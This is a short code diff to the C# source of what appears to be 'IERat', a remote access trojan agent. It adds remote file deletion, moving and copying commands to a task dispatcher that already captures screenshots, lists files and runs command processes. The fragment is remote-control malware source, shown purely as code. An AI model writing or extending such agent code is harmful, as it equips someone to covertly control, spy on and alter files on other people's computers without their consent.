@@ -288,6 +288,18 @@ namespace IERat.lib
                                 {
                                     NewAgentTask.Result = Screenshot.Collect();
                                 }
+                                else if (CmdType == "rm")
+                                {
+                                    NewAgentTask.Result = FileOperations.rm(NewAgentTask.args);
+                                }
+                                else if (CmdType == "mv")
+                                {
+                                    NewAgentTask.Result = FileOperations.mv(NewAgentTask.args);
+                                }
+                                else if (CmdType == "cp")
+                                {
+                                    NewAgentTask.Result = FileOperations.cp(NewAgentTask.args);
+                                }
                                 else if (CmdType == "ls")
                                 {
                                     // need to add directories too
@@ -329,7 +341,7 @@ namespace IERat.lib
                                     cmdProcess.Start();
                                     cmdProcess.BeginOutputReadLine();
                                 }
-                                else { NewAgentTask.Result = "error - unknown command"; }
+                                else { NewAgentTask.Result = "Error - unknown command"; }
 
                             }
                             catch (Exception ex)
